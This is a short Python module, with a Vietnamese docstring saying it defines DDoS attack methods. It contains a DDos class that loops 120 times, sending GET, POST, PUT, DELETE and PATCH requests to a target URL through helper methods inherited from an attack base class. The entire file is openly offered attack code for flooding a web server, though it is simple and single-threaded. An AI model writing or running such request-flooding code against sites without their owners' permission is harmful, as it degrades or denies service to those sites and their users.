'''
    Mục đích: Định nghĩa các phương thức tấn công DDos
'''
import requests
from core.attacks.base_method import BaseAttacksMethods


class DDos(BaseAttacksMethods):
    number_request: int = 120

    @staticmethod
    def DDos_basic(url: str, options: dict = {}) -> None:
        for _ in range(DDos.number_request):
            DDos._get(url, options)
            DDos._post(url, options)
            DDos._put(url, options)
            DDos._delete(url, options)
            DDos._patch(url, options)

    @staticmethod
    def DDos(url: str, options: dict = {}) -> None:
        DDos.DDos_basic(url, options)
        

    